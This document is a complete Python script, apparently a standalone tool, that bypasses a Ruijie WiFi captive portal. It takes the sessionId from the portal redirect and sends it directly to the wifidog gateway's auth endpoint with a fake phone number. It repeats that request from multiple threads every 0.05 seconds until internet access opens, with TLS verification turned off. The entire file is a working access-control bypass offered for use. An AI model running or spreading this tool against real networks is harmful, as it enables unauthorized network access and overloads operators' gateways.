#!/usr/bin/env python3
"""
Ruijie WiFi Portal Tool
Minimal approach: extract SID -> ping wifidog aggressively.
"""

import argparse
import logging
import re
import signal
import sys
import threading
import time
from urllib.parse import urljoin, urlparse, parse_qs

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("ruijie")

BANNER = r"""
  _____  _    _ _____       _ _____ ______
 |  _  /| |  | | | |   _   | | | | |  __|
 |  __ \| |  | |_   _|     | |_   _|  ____|
 | | \ \| |__| |_| |_ | |__| |_| |_| |____
 | |__) | |  | | | |       | | | | | |__
 |_|  \_\____/|_____| \____/|_____|______|
"""


def check_internet():
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3, allow_redirects=False)
        return r.status_code == 204
    except Exception:
        return False


def get_sid(sess):
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204",
                 allow_redirects=True, timeout=5)
    if r.status_code == 204:
        return None, None, None

    portal_url = r.url
    parsed = urlparse(portal_url)
    host = f"{parsed.scheme}://{parsed.netloc}"

    current = portal_url
    for _ in range(10):
        r = sess.get(current, verify=False, timeout=10)
        html = r.text
        current = str(r.url)
        sid = parse_qs(urlparse(current).query).get("sessionId", [None])[0]
        if sid:
            return sid, portal_url, host
        sid = re.search(r"sessionId=([a-f0-9]{32})", html)
        if sid:
            return sid.group(1), portal_url, host
        m = re.search(r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?\d+;?\s*url=([^"\' >]+)', html, re.I)
        if m:
            current = urljoin(current, m.group(1))
            continue
        m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", html)
        if m:
            current = urljoin(current, m.group(1))
            continue
        break
    return None, None, None


def ping_loop(auth_url, sess):
    while True:
        try:
            sess.get(auth_url, timeout=5)
        except Exception:
            break
        time.sleep(0.05)


def run(threads=10, interval=0.05):
    log.info("Starting...")
    while True:
        sess = requests.Session()
        sess.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        sess.verify = False

        try:
            sid, portal_url, host = get_sid(sess)
            if not sid:
                time.sleep(3)
                sess.close()
                continue

            qs = parse_qs(urlparse(portal_url).query)
            gw = qs.get("gw_address", ["192.168.110.1"])[0]
            gp = qs.get("gw_port", ["2060"])[0]
            mac = qs.get("mac", [""])[0]
            ip = qs.get("ip", [""])[0]

            log.info(f"[*] SID: {sid} | GW: {gw}:{gp}")

            gw_url = f"http://{gw}:{gp}/wifidog/auth?token={sid}&phonenumber=12345"
            try:
                sess.get(f"http://{gw}:{gp}/wifidog/portal", timeout=5)
                sess.get(gw_url, timeout=5)
            except Exception:
                pass

            log.info(f"[*] Starting {threads}x ping threads...")
            for _ in range(threads):
                threading.Thread(target=ping_loop, args=(gw_url, sess), daemon=True).start()

            time.sleep(10)
            log.info("[*] Checking...")
            for i in range(30):
                if check_internet():
                    log.info("[+] ONLINE!")
                    while check_internet():
                        time.sleep(5)
                    log.warning("[-] Disconnected")
                    break
                time.sleep(2)
            else:
                log.warning("[-] Retrying...")

            sess.close()
            time.sleep(3)

        except KeyboardInterrupt:
            log.info("Stopped")
            break
        except Exception as e:
            log.warning(f"[!] {e}")
            sess.close()
            time.sleep(5)


def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--threads", type=int, default=10)
    parser.add_argument("-i", "--interval", type=float, default=0.05)
    args = parser.parse_args()
    signal.signal(signal.SIGINT, lambda s, f: (log.info("Stopped"), sys.exit(0)))
    run(threads=args.threads, interval=args.interval)


if __name__ == "__main__":
    main()
